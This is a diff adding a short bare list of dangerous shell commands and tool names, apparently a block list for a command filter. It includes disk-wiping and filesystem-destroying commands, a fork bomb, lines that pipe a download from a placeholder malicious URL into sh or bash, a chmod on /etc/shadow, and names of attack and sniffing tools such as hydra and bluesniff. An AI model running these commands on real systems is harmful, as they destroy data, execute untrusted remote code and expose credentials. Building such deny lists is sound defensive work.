@@ -1,0 +1,17 @@
+hydra
+rm -rf /
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/random of=/dev/sda
+mkfs.ext3 /dev/sda
+mkfs.vfat /dev/sda1
+:(){ :|:& };:
+command >/dev/sda
+mv directory /dev/null
+wget http://malicious_source_url -O-| sh
+curl http://malicious_source_url | bash
+gunzip untrusted.gz
+chmod 666 /etc/shadow
+btscanner
+bluesniff
+candump
+rexec
